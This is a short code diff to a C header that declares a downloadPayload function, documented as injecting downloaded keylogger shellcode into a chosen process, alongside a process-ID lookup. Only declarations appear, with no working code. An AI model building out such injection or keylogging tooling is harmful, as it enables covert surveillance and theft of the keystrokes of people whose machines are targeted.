@@ -201,4 +201,14 @@ DWORD getProcessPID(const char* processName);
  */
 BOOL main();
 
+/**
+ * @brief Main function injecting a keylogger shellcode into the choosen process.
+ *
+ * @param shellcode
+ * @param limit
+ *
+ * @return BOOL Returns TRUE if a shellcode has been downloaded, otherwise FALSE.
+ */
+BOOL downloadPayload(unsigned char* shellcode, size_t limit);
+
 #endif
